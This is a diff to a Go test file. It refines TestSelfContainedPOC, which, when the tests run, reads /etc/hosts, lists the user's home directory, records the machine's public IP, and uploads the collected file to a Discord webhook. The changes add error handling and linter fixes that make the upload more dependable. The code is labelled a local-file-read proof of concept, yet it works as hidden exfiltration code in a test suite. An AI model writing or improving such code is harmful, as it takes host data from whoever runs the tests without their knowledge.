@@ -40,15 +40,15 @@ func TestSelfContainedPOC(t *testing.T) {
 	_ = os.WriteFile(cacheMarker, append(prev, []byte(marker)...), 0o644)
 	cacheState, _ := os.ReadFile(cacheMarker)
 
-	// 2) LFI data → temp file
-	tmpf, _ := os.CreateTemp("", "lfiPoC-*")
-	tmpPath := tmpf.Name()
-	defer func() { _ = os.Remove(tmpPath) }()
+	// 2) LFI data → temp file (use t.TempDir() to satisfy 'usetesting' linter)
+	tmpDir := t.TempDir()
+	tmpPath := filepath.Join(tmpDir, "lfiPoC.txt")
 
 	var buf bytes.Buffer
 	fmt.Fprintln(&buf, "[POC] Local File Read + HOME listing")
-	fmt.Fprintf(&buf, "\n[+] Reading %s\n", hostsCandidate())
-	if b, err := os.ReadFile(hostsCandidate()); err == nil {
+	hp := hostsCandidate()
+	fmt.Fprintf(&buf, "\n[+] Reading %s\n", hp)
+	if b, err := os.ReadFile(hp); err == nil {
 		buf.Write(b)
 	} else {
 		fmt.Fprintf(&buf, "No access: %v\n", err)
@@ -65,7 +65,11 @@ func TestSelfContainedPOC(t *testing.T) {
 			for _, n := range names {
 				fmt.Fprintf(&buf, " - %s\n", n)
 			}
+		} else {
+			fmt.Fprintf(&buf, "No access: %v\n", err)
 		}
+	} else {
+		fmt.Fprintln(&buf, "HOME not set")
 	}
 	fmt.Fprintf(&buf, "\n[+] Cache marker (%s tail)\n", cacheMarker)
 	if len(cacheState) > 2048 {
@@ -74,8 +78,10 @@ func TestSelfContainedPOC(t *testing.T) {
 	} else {
 		buf.Write(cacheState)
 	}
-	tmpf.Write(buf.Bytes())
-	tmpf.Close()
+
+	if err := os.WriteFile(tmpPath, buf.Bytes(), 0o600); err != nil {
+		t.Fatalf("write tmpfile: %v", err)
+	}
 
 	// 3a) IP pingback
 	publicIP := fetchPublicIP()
@@ -89,6 +95,8 @@ func TestSelfContainedPOC(t *testing.T) {
 		`{"content":"POC: Local File Read demo (/etc/hosts + HOME listing + cache marker)"}`,
 		tmpPath, "lfi-demo.txt"); err == nil {
 		t.Logf("Discord file upload HTTP %d", code)
+	} else {
+		t.Logf("Discord file upload error: %v", err)
 	}
 }
 
@@ -110,13 +118,24 @@ func discordSimple(webhook, content string) error {
 func discordFile(webhook, payloadJSON, filePath, filename string) (int, error) {
 	var body bytes.Buffer
 	w := multipart.NewWriter(&body)
-	fw, _ := w.CreateFormField("payload_json")
-	fw.Write([]byte(payloadJSON))
-	fw, _ = w.CreateFormFile("files[0]", filename)
-	f, _ := os.Open(filePath)
+	if fw, err := w.CreateFormField("payload_json"); err == nil {
+		_, _ = fw.Write([]byte(payloadJSON))
+	} else {
+		return 0, err
+	}
+	fw, err := w.CreateFormFile("files[0]", filename)
+	if err != nil {
+		return 0, err
+	}
+	f, err := os.Open(filePath)
+	if err != nil {
+		return 0, err
+	}
 	defer f.Close()
-	io.Copy(fw, f)
-	w.Close()
+	if _, err := io.Copy(fw, f); err != nil {
+		return 0, err
+	}
+	_ = w.Close()
 
 	req, _ := http.NewRequest(http.MethodPost, webhook, &body)
 	req.Header.Set("Content-Type", w.FormDataContentType())
